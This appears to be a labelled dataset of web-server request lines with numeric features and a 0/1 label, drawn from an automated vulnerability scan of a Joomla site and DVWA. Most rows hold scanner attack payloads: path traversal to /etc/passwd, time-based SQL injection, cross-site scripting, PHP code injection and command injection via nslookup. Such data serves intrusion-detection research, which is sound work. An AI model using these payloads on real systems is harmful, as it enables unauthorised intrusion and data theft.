97,3,200,1525,7,64,12,4,0,GET /index.php/2-uncategorised/1-testsayfasi?page=set%7cset%26set&print=1&tmpl=component HTTP/1.1
25,1,404,502,7,10,1,3,1,GET /statistics/ HTTP/1.1
110,1,200,3310,7,76,10,7,1,GET /index.php/;print(md5(acunetix_wvs_security_test));/content/article/2-uncategorised/1-testsayfasi HTTP/1.1
95,3,200,3142,7,66,11,5,1,GET /index.php/component/search/?ordering=oldest&searchphrase=all&searchword=%bf'%bf\" HTTP/1.1
92,1,500,2083,11,40,17,5,1,GET /index.php/component/users/?view=8OWgL7fS';%20waitfor%20delay%20'0:0:2'%20--%20 HTTP/1.1
152,3,500,2055,7,55,56,30,1,GET /index.php/component/content/?format=feed&type=atom&view=../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd HTTP/1.1
104,1,404,587,21,43,12,4,1,GET /%26nslookup%20OENbNEQG%26'%5c\"`0%26nslookup%20OENbNEQG%26`'/2-uncategorised/1-testsayfasi HTTP/1.1
86,1,302,384,11,46,11,3,1,GET /DVWA/security.php?test=%24{%40print(md5(acunetix_wvs_security_test))}%5c HTTP/1.1
96,1,500,2019,8,40,26,16,1,POST /index.php/component/users/?task=../../../../../../../../../../etc/passwd%00.login HTTP/1.1
53,1,404,530,7,31,4,7,1,GET /http://www.vulnweb.com/component/users/ HTTP/1.1
159,3,200,1855,7,90,18,5,1,GET /index.php/component/mailto/?link=0011f090d89f910f3d24e9873575a8d16029ca3e&template=';print(md5(acunetix_wvs_security_test));%24a='&tmpl=component HTTP/1.1
77,1,500,2089,7,39,8,5,1,GET /index.php/component/users/?view=response.write(9495727*9561186) HTTP/1.1
85,3,200,3106,7,61,8,5,0,GET /index.php/component/search/?ordering=alpha&searchphrase=all&searchword= HTTP/1.1
30,1,404,507,7,15,1,3,1,GET /computing/robots HTTP/1.1
71,1,404,3993,7,40,7,6,1,GET /index.php/component/%f0''%f0\"\"/category/2-uncategorised HTTP/1.1
161,3,200,3225,7,96,40,6,0,GET /index.php/component/search/?ordering=popular&searchphrase=any&searchword=..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd HTTP/1.1
178,3,200,1855,7,68,40,30,1,GET /index.php/component/mailto/?link=0011f090d89f910f3d24e9873575a8d16029ca3e&template=../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd&tmpl=component HTTP/1.1
99,1,404,3989,16,42,17,7,1,GET /index.php/component/content/category/2-'\"()%26%25<acx><ScRiPt%20>KmPG(9588)</ScRiPt> HTTP/1.1
47,1,200,1441,7,26,2,5,0,GET /templates/beez_20/css/general.css HTTP/1.1
116,1,200,3313,7,76,10,7,1,GET /index.php/%24{%40print(md5(acunetix_wvs_security_test))}/content/article/2-uncategorised/1-testsayfasi HTTP/1.1
115,3,500,1983,7,65,14,5,1,GET /index.php/component/content/?format=feed&type=\"%2bresponse.write(9228005*9127354)%2b\"&view=featured HTTP/1.1
78,3,500,2045,7,50,9,5,1,GET /index.php/component/content/?format=1'\"&type=atom&view=featured HTTP/1.1
73,1,404,4076,10,34,7,7,1,GET http://192.168.4.161/index.php/component/search/Le9NKjca.jsp HTTP/1.1
107,1,404,564,23,46,12,6,1,GET /acu8985%EF%BC%9Cs1%EF%B9%A5s2%CA%BAs3%CA%B9uca8985/component/content/category/2-uncategorised HTTP/1.1
45,1,200,756,7,27,2,5,0,GET /templates/system/css/system.css HTTP/1.1
59,1,200,2764,8,35,7,5,0,POST /index.php/component/users/?task[]=user.login HTTP/1.1
104,1,301,745,19,54,11,4,0,GET /DVWA/vulnerabilities/fi?page=%E5%98%8A%E5%98%8DSomeCustomInjectedHeader:%20injected_by_wvs HTTP/1.1
113,1,200,2767,8,35,36,30,1,POST /index.php/component/users/?task=../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd HTTP/1.1
85,1,200,3520,7,45,15,4,1,GET /index.php/2-uncategorised/-1);select%20pg_sleep(2);%20--%20-testsayfasi HTTP/1.1
96,1,404,3993,13,50,8,6,1,GET /index.php/component/content/acux3487%C0%BEz1%C0%BCz2a%90bcxuca3487/2-uncategorised HTTP/1.1
65,1,404,3993,12,39,3,6,1,GET /index.php/HdAWwOaY/content/category/2-uncategorised HTTP/1.1
23,1,301,583,7,9,1,2,0,GET /libraries HTTP/1.1
95,1,200,3252,9,60,7,10,1,GET /index.php/component/content/article/2-http://hit4xl8K9hMuz.bxss.me//1-testsayfasi HTTP/1.1
119,3,200,338,7,67,11,5,1,GET /index.php/component/mailto/?link=90ed7f9d717b47dafcf4b4c1bb9de7c57b1fb587&template=beez_20&tmpl=%bf'%bf\" HTTP/1.1
126,4,200,3255,7,76,13,5,1,GET /index.php/component/search/?searchword={{10000175*10000467}}&ordering=oldest&searchphrase=all&areas[0]=newsfeeds HTTP/1.1
49,1,404,3996,7,26,3,9,1,GET /index.php/file:///etc/passwd/users/ HTTP/1.1
68,1,200,3483,7,42,5,6,0,GET /index.php/component/content/category/2-set%7cset%26set HTTP/1.1
123,4,200,3173,13,88,12,5,1,GET /index.php/component/search/?searchword=the&ordering=popular&searchphrase=acxScRiPtkzsyScRiPt&areas[0]=content HTTP/1.1
102,1,404,547,7,71,5,6,1,GET /index.php/component/1some_inexistent_file_with_long_name%00.jpg/category/2-uncategorised HTTP/1.1
49,1,500,2043,7,27,5,5,1,GET /index.php/component/users/?view=%5c HTTP/1.1
123,5,200,3185,7,80,20,5,1,GET /index.php/component/search/?searchword='\"()&%kzsy(9035)=&ordering=alpha&searchphrase=all&areas[0]=categories HTTP/1.1
99,1,200,3541,14,44,18,5,1,GET /index.php/2-uncategorised/1-testsayfasi'\"()%26%25<acx><ScRiPt%20>nzRa(9386)</ScRiPt> HTTP/1.1
96,3,200,1729,13,59,11,5,0,GET /index.php/component/mailto/?link=WEB-INF%5cweb.xml&template=beez_20&tmpl=component HTTP/1.1
127,3,200,1855,13,65,10,6,0,GET /index.php/component/mailto/?link=0011f090d89f910f3d24e9873575a8d16029ca3e&template=WEB-INF/web.xml&tmpl=component HTTP/1.1
167,3,200,338,7,65,38,21,1,GET /index.php/component/mailto/?link=0011f090d89f910f3d24e9873575a8d16029ca3e&template=beez_20&tmpl=../../../../../../../../../../../../../../../proc/version HTTP/1.1
107,4,200,3169,7,78,12,5,0,GET /index.php/component/search/?searchword=the&ordering=newest&searchphrase=any&areas[0]=contacts HTTP/1.1
90,3,500,1983,13,56,10,7,1,GET /index.php/component/content/?format=feed&type=/WEB-INF/web.xml&view=featured HTTP/1.1
96,3,500,2081,7,56,10,5,1,GET /index.php/component/content/?format=feed&type=atom&view=featured%26n954526=v987369 HTTP/1.1
40,1,200,2721,7,22,2,5,0,GET /index.php/component/users/ HTTP/1.1
78,1,404,553,7,45,11,5,1,GET /';print(md5(acunetix_wvs_security_test));%24a='/component/users/ HTTP/1.1
85,3,500,2065,10,55,10,5,1,GET /index.php/component/content/?format=feed&type=rss&view=featured<BLxiS7< HTTP/1.1
134,4,200,3196,13,95,12,5,1,GET /index.php/component/search/?searchword=the&ordering=oldest&searchphrase=exact&areas[0]=categoriesacxScRiPtkzsy9036ScRiPt HTTP/1.1
105,1,404,3988,10,61,14,6,1,GET /index.php/component/content/category/lp1mMT6M');select%20pg_sleep(6);%20--%20-uncategorised HTTP/1.1
78,2,500,2069,7,34,17,2,1,GET /index.php?format=1%20waitfor%20delay%20'0:0:2'%20--%20&type=atom HTTP/1.1
143,3,200,3230,7,73,38,21,1,GET /index.php/component/search/?ordering=newest&searchphrase=all&searchword=../../../../../../../../../../../../../../../proc/version HTTP/1.1
43,1,404,3995,9,16,4,5,1,GET /index.php/%40%405LBhn/search/ HTTP/1.1
134,3,200,338,10,66,12,5,0,GET /index.php/component/mailto/?link=0011f090d89f910f3d24e9873575a8d16029ca3e&template=beez_20&tmpl=%24(nslookup%202iUdTaeP) HTTP/1.1
127,3,200,1488,9,58,24,4,0,GET /index.php/2-uncategorised/1-testsayfasi?page=-1%20OR%202%2b595-595-1=0%2b0%2b0%2b1%20--%20&print=1&tmpl=component HTTP/1.1
125,3,200,338,13,69,10,6,0,GET /index.php/component/mailto/?link=90ed7f9d717b47dafcf4b4c1bb9de7c57b1fb587&template=beez_20&tmpl=WEB-INF/web.xml HTTP/1.1
27,1,404,504,7,7,3,2,1,GET /192_db.tar.gz HTTP/1.1
92,1,301,721,15,55,7,4,0,GET /DVWA/vulnerabilities/fi?page=%0d%09SomeCustomInjectedHeader:%20injected_by_wvs HTTP/1.1
105,4,200,3131,7,76,12,5,0,GET /index.php/component/search/?searchword=&ordering=newest&searchphrase=all&areas[0]=newsfeeds HTTP/1.1
125,1,404,566,7,60,26,24,1,GET /index.php/component/content//../..//../..//../..//../..//../..//etc/passwd%00.jpg/2-uncategorised/1-testsayfasi HTTP/1.1
46,1,200,31450,7,27,3,5,0,GET /media/system/js/mootools-core.js HTTP/1.1
140,3,200,3124,7,69,33,23,1,GET /index.php/component/search/?ordering=popular&searchphrase=/.././.././.././.././.././.././.././../etc/./passwd%2500&searchword= HTTP/1.1
105,1,404,3993,10,57,13,8,1,GET /index.php/component/content/%f6<img%20acu%20onmouseover=KmPG(9052)%20//%f6>/2-uncategorised HTTP/1.1
109,1,404,565,7,75,6,7,1,GET /index.php/component/content/article/2-1some_inexistent_file_with_long_name%00.jpg/1-testsayfasi HTTP/1.1
203,3,200,338,18,75,41,5,0,GET /index.php/component/mailto/?link=90ed7f9d717b47dafcf4b4c1bb9de7c57b1fb587&template=beez_20&tmpl=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.jpg HTTP/1.1
63,1,500,2021,14,32,6,7,1,POST /index.php/component/users/?task=/WEB-INF/web.xml HTTP/1.1
80,1,302,384,11,48,10,3,1,GET /DVWA/instructions.php?doc=;print(md5(acunetix_wvs_security_test)); HTTP/1.1
133,3,200,338,13,66,19,4,1,GET /index.php/2-uncategorised/1-testsayfasi?page=&print=1&tmpl=%26nslookup%20r9BlV38O%26'%5c\"`0%26nslookup%20r9BlV38O%26`' HTTP/1.1
125,4,200,3150,13,90,12,5,1,GET /index.php/component/search/?searchword=&ordering=oldest&searchphrase=allacxScRiPtkzsyScRiPt&areas[0]=categories HTTP/1.1
25,1,404,502,7,6,3,2,1,GET /192.sql.tar HTTP/1.1
56,1,302,384,17,24,7,3,0,GET /DVWA/security.php?phpids=WEB-INF%5cweb.xml HTTP/1.1
125,3,200,3223,13,76,13,5,0,GET /index.php/component/search/?ordering=popular&searchphrase=any&searchword=acux8963%C0%BEz1%C0%BCz2a%90bcxuca8963 HTTP/1.1
87,1,200,2796,14,41,15,5,1,POST /index.php/component/users/?task=LOYDRBlf');select%20pg_sleep(6);%20--%20 HTTP/1.1
84,1,302,384,13,19,18,3,1,GET /DVWA/security.php?test=-1\"%20OR%202%2b439-439-1=0%2b0%2b0%2b1%20--%20 HTTP/1.1
60,1,200,237,8,38,5,5,0,POST /index.php/component/users/?task=remind.remind HTTP/1.1
108,1,302,384,11,17,73,3,0,GET /DVWA/security.php?phpids=))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))) HTTP/1.1
32,1,302,384,12,11,2,3,0,POST /DVWA/security.php HTTP/1.1
150,3,200,338,11,71,19,5,1,GET /index.php/component/mailto/?link=0011f090d89f910f3d24e9873575a8d16029ca3e&template=beez_20&tmpl=pGHPuwHw');select%20pg_sleep(3);%20--%20 HTTP/1.1
79,1,404,554,7,40,14,6,1,GET /!(()%26%26!%7c*%7c*%7c/component/content/category/2-uncategorised HTTP/1.1
129,1,302,384,14,83,13,7,1,GET /DVWA/security.php?test=http://some-inexistent-website.acu/some_inexistent_file_with_long_name%3F.name)%3C/script%3E HTTP/1.1
102,3,200,3122,7,73,9,9,1,GET /index.php/component/search/?ordering=popular&searchphrase=file:///etc/passwd&searchword= HTTP/1.1
135,4,200,3270,7,94,16,5,1,GET /index.php/component/search/?searchword=ul.menu\"onmouseover=kzsy(9152)\"&ordering=alpha&searchphrase=all&areas[0]=content HTTP/1.1
19,1,302,384,11,0,1,3,0,GET /DVWA/ HTTP/1.1
84,1,200,3512,9,34,13,6,0,GET /index.php/component/content/category/2--1%20OR%203*2<(0%2b5%2b582-582) HTTP/1.1
134,3,200,3286,7,94,18,5,1,GET /index.php/component/search/?ordering=popular&searchphrase=all&searchword=';print(md5(acunetix_wvs_security_test));%24a=' HTTP/1.1
122,5,200,3188,7,79,20,5,1,GET /index.php/component/search/?searchword='\"()&%kzsy(9530)=&ordering=newest&searchphrase=all&areas[0]=contacts HTTP/1.1
20,1,404,497,7,1,2,2,1,GET /192.7z HTTP/1.1
184,3,200,338,7,96,40,6,0,GET /index.php/component/mailto/?link=90ed7f9d717b47dafcf4b4c1bb9de7c57b1fb587&template=beez_20&tmpl=..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd HTTP/1.1
121,1,404,3990,7,79,12,7,1,GET /index.php/component/\";print(md5(acunetix_wvs_security_test));%24a=\"/article/2-uncategorised/1-testsayfasi HTTP/1.1
120,2,200,3147,13,69,19,2,1,GET /index.php?wvstest=javascript:domxssExecutionSink(1_%22'%5C%22%3E%3Cxsstag%3E()locxss%22)&option=com_search HTTP/1.1
56,1,404,3993,7,32,5,4,1,GET /index.php/2-uncategorised/524'-testsayfasi HTTP/1.1
125,1,404,578,18,27,34,5,1,GET /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.php/component/search/ HTTP/1.1
127,1,200,3263,7,86,11,7,1,GET /index.php/component/content/article/%24{%40print(md5(acunetix_wvs_security_test))}%5c-uncategorised/1-testsayfasi HTTP/1.1
77,2,500,2049,9,25,16,2,1,GET /index.php?format=-1%20OR%202%2b183-183-1=0%2b0%2b0%2b1&type=rss HTTP/1.1
118,1,404,513,7,41,36,29,1,GET /index.php/2-uncategorised/../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd-testsayfasi HTTP/1.1
118,4,200,3175,7,82,12,5,0,GET /index.php/component/search/?searchword=the&ordering=oldest&searchphrase=exact&areas[0]=categories9274910 HTTP/1.1
127,4,200,3191,13,91,13,5,1,GET /index.php/component/search/?searchword=ul.menu&ordering=newest&searchphrase=acxScRiPtkzsyScRiPt&areas[0]=contacts HTTP/1.1
128,3,200,338,7,76,9,9,1,GET /index.php/component/mailto/?link=90ed7f9d717b47dafcf4b4c1bb9de7c57b1fb587&template=beez_20&tmpl=file:///etc/passwd HTTP/1.1
84,3,403,3982,7,52,11,5,1,GET /index.php/component/mailto/?link='\"()&template=beez_20&tmpl=component HTTP/1.1
102,1,404,582,13,59,11,6,1,GET /index.php<img%20src=xyz%20OnErRor=KmPG(9846)>/component/content/category/2-uncategorised HTTP/1.1
126,3,200,3261,11,79,18,5,1,GET /index.php/component/search/?ordering=newest&searchphrase=any&searchword=DfRBpxgY';select%20pg_sleep(14);%20--%20 HTTP/1.1
122,5,200,3190,7,79,20,5,1,GET /index.php/component/search/?searchword='\"()&%kzsy(9138)=&ordering=newest&searchphrase=any&areas[0]=contacts HTTP/1.1
134,3,200,3263,10,78,21,5,1,GET /index.php/component/search/?ordering=category&searchphrase=all&searchword=Zvq1N0Q0';%20waitfor%20delay%20'0:0:6'%20--%20 HTTP/1.1
58,1,500,2043,7,28,8,5,1,GET /index.php/component/users/?view=%f0''%f0\"\" HTTP/1.1
93,1,200,2807,15,37,18,6,1,POST /index.php/component/users/?task='\"()%26%25<acx><ScRiPt%20>y3iC(9140)</ScRiPt> HTTP/1.1
66,1,200,3476,7,45,3,6,0,GET /index.php/component/content/category/2-uncategorised HTTP/1.1
86,3,200,3109,7,62,8,5,0,GET /index.php/component/search/?ordering=newest&searchphrase=any&searchword= HTTP/1.1
136,3,200,3128,7,65,33,23,1,GET /index.php/component/search/?ordering=/.././.././.././.././.././.././.././../etc/./passwd%2500&searchphrase=any&searchword= HTTP/1.1
163,3,200,1524,7,63,58,29,1,GET /index.php/2-uncategorised/1-testsayfasi?page=&print=../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd&tmpl=component HTTP/1.1
103,1,302,384,11,38,28,10,1,GET /DVWA/security.php?phpids=.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./etc/passwd HTTP/1.1
86,1,302,384,16,41,14,4,1,GET /DVWA/security.php?test[]=\"%3E%3Cscript%3Eeval(window.name)%3C/script%3E HTTP/1.1
123,3,500,2111,7,81,15,5,1,GET /index.php/component/content/?format=%24{%40print(md5(acunetix_wvs_security_test))}%5c&type=atom&view=featured HTTP/1.1
27,1,404,504,7,11,3,2,1,GET /backup.tar.gz HTTP/1.1
118,1,400,485,7,64,24,18,1,GET /index.php/component/content/article/../../../../../../../../../../etc/passwd-uncategorised/1-testsayfasi HTTP/1.1
145,4,200,3276,9,91,24,5,1,GET /index.php/component/search/?searchword=ul.menu\"%20kq1G=kzsy([!%20!])%20Deq=\"&ordering=newest&searchphrase=all&areas[0]=categories HTTP/1.1
176,3,200,3123,18,71,41,5,0,GET /index.php/component/search/?ordering=newest&searchphrase=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.jpg&searchword= HTTP/1.1
64,1,302,384,14,29,8,3,0,GET /DVWA/instructions.php?doc=%24(nslookup%20aIU6kuW4) HTTP/1.1
105,3,200,3111,7,59,10,5,1,GET /index.php/component/search/?ordering=alpha&searchphrase=%24{9999165%2b10000184}&searchword= HTTP/1.1
125,4,200,3210,7,76,13,5,1,GET /index.php/component/search/?searchword={{10000286*9999258}}&ordering=popular&searchphrase=any&areas[0]=contacts HTTP/1.1
147,3,200,338,9,58,18,5,0,GET /index.php/component/mailto/?link=0011f090d89f910f3d24e9873575a8d16029ca3e&template=beez_20&tmpl=-1%20OR%203%2b491-491-1=0%2b0%2b0%2b1 HTTP/1.1
142,4,200,3280,7,97,16,5,0,GET /index.php/component/search/?searchword=ul.menuu0022onmouseover=kzsy(9593)u0022&ordering=alpha&searchphrase=any&areas[0]=contacts HTTP/1.1
61,1,404,3993,7,36,7,6,1,GET /index.php/<!--/content/category/2-uncategorised HTTP/1.1
170,1,404,585,18,23,45,5,1,GET /index.php%3C%53%63%52%3C%53%63%52%69%50%74%3E%49%70%54%3E%4A%49%66%7A%28%39%38%38%36%29%3C%2F%73%43%72%3C%53%63%52%69%50%74%3E%49%70%54%3E/component/search/ HTTP/1.1
129,3,200,338,7,65,10,5,0,GET /index.php/component/mailto/?link=0011f090d89f910f3d24e9873575a8d16029ca3e&template=beez_20&tmpl=%252fetc%252fpasswd HTTP/1.1
106,3,200,3153,7,74,10,5,0,GET /index.php/component/search/?ordering=popular&searchphrase=any&searchword=%252fetc%252fpasswd HTTP/1.1
74,1,302,384,11,27,15,3,1,GET /DVWA/security.php?test=1%20waitfor%20delay%20'0:0:2'%20--%20 HTTP/1.1
27,1,404,504,7,9,2,2,1,GET /192backup.tar HTTP/1.1
